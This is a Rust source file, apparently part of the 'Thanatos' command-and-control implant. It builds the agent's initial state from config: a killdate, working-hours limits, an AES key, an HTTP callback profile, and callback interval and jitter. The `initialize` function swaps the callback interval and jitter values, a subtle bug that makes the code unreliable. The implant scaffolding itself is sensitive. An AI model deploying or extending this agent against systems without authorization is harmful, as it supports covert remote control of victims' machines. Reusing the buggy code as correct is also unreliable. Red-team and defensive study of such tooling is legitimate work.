use std::{
    marker::PhantomData,
    time::{Duration, SystemTime},
};

use crate::{
    config::Config,
    crypto::{base64, xoshiro::Xoshiross},
    errors::ThanatosError,
    profiles::HttpProfile,
};

use super::{
    errors::{AgentError, ConfigParseError},
    initialized::Initialized,
    traits::{private::Sealed, AgentState},
    workinghours, Agent,
};

pub struct Uninitialized;
impl Sealed for Uninitialized {}
impl AgentState for Uninitialized {}

impl Agent<Uninitialized> {
    pub fn new(agent_config: &Config) -> Result<Agent<Uninitialized>, ThanatosError> {
        let killdate = std::time::UNIX_EPOCH
            .checked_add(Duration::from_secs(agent_config.killdate))
            .ok_or(ThanatosError::SystemTimeError)?;

        if SystemTime::now() >= killdate {
            return Err(ThanatosError::Agent(AgentError::PastKilldate));
        }

        let working_start = workinghours::parse_working_hours(&agent_config.working_start)
            .map_err(|_| {
                ThanatosError::Agent(AgentError::ConfigParse(ConfigParseError::WorkingStart))
            })?;

        let working_end =
            workinghours::parse_working_hours(&agent_config.working_end).map_err(|_| {
                ThanatosError::Agent(AgentError::ConfigParse(ConfigParseError::WorkingEnd))
            })?;

        let working_end = working_end + Duration::from_secs(60);

        let aes_key = agent_config
            .aes_key
            .as_ref()
            .map(|key| {
                base64::decode(key)
                    .map_err(|_| {
                        ThanatosError::Agent(AgentError::ConfigParse(ConfigParseError::AesKey))
                    })
                    .and_then(|key| {
                        <[u8; 32]>::try_from(key).map_err(|_| {
                            ThanatosError::Agent(AgentError::ConfigParse(ConfigParseError::AesKey))
                        })
                    })
            })
            .transpose()?;

        Ok(Agent {
            uuid: agent_config.uuid.clone(),
            connection_retries: agent_config.connection_retries,
            callback_interval: agent_config.callback_interval,
            callback_jitter: agent_config.callback_jitter,
            profile: HttpProfile::configure(&agent_config).map_err(|e| {
                ThanatosError::Agent(AgentError::ConfigParse(ConfigParseError::Profile(e)))
            })?,
            working_start,
            working_end,
            killdate,
            aes_key,
            rng: Xoshiross::naive_seed(),
            _s: PhantomData,
        })
    }

    pub fn initialize(self) -> Agent<Initialized> {
        Agent {
            uuid: self.uuid,
            connection_retries: self.connection_retries,
            working_start: self.working_start,
            working_end: self.working_end,
            killdate: self.killdate,
            callback_jitter: self.callback_interval,
            callback_interval: self.callback_jitter,
            aes_key: self.aes_key,
            profile: self.profile,
            rng: self.rng,
            _s: PhantomData,
        }
    }
}
